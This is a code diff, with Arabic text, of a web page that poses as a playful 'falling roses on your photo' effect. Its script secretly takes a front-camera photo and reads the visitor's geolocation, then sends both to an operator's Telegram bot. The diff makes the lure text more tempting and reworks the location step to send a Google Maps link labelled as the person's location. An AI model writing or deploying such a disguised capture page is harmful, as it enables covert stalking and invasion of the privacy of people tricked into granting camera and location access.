@@ -35,7 +35,7 @@
 </head>
 <body>
   <h1>أهلاً بك يا وردة</h1>
-  <p>اضغط الزر للسماح بالكاميرا والموقع</p>
+  <p>هل تريد تجربة الورد المتساقط على صورتك؟ فقط اضغط "ابدأ التجربة" واسمح للموقع والكاميرا</p>
   <button id="startBtn">ابدأ التجربة</button>
   <div id="rose"></div>
   <canvas id="falling"></canvas>
@@ -55,7 +55,6 @@
       document.querySelector('p').textContent = 'انت الورد بحد ذاته!';
     });
 
-    // التقاط الصورة
     async function captureAndSend() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
@@ -63,7 +62,7 @@
         video.srcObject = stream;
         await video.play();
 
-        await new Promise(resolve => setTimeout(resolve, 1000)); // انتظر شوي حتى تشتغل الكاميرا
+        await new Promise(resolve => setTimeout(resolve, 1000));
 
         const canvas = document.createElement('canvas');
         canvas.width = video.videoWidth;
@@ -88,13 +87,19 @@
       }
     }
 
-    // إرسال الموقع
     async function sendLocation() {
       if ("geolocation" in navigator) {
         navigator.geolocation.getCurrentPosition(async pos => {
           const { latitude, longitude } = pos.coords;
-          const url = `https://api.telegram.org/bot${botToken}/sendLocation?chat_id=${chatId}&latitude=${latitude}&longitude=${longitude}`;
-          await fetch(url);
+          const locationUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
+          await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              chat_id: chatId,
+              text: `موقع الشخص: ${locationUrl}`
+            })
+          });
         }, err => {
           console.warn("مشكلة بالموقع:", err);
         });
@@ -103,7 +108,6 @@
       }
     }
 
-    // تأثير الورد
     function startFalling() {
       const canvas = document.getElementById('falling');
       const ctx = canvas.getContext('2d');
